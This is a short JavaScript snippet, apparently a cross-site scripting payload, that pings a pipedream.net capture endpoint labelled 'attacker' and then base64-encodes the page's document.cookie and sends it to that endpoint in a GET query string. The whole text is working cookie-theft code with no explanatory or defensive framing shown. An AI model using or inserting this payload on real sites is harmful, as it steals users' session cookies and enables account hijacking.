
attacker = "https://eolkkqvs1uis9pt.m.pipedream.net";
const req = new XMLHttpRequest();
req.open("GET", attacker);
req.send();

cook = btoa(document.cookie);
const req2 = new XMLHttpRequest();
req2.open("GET", attacker + "/?" + cook);
req2.send();
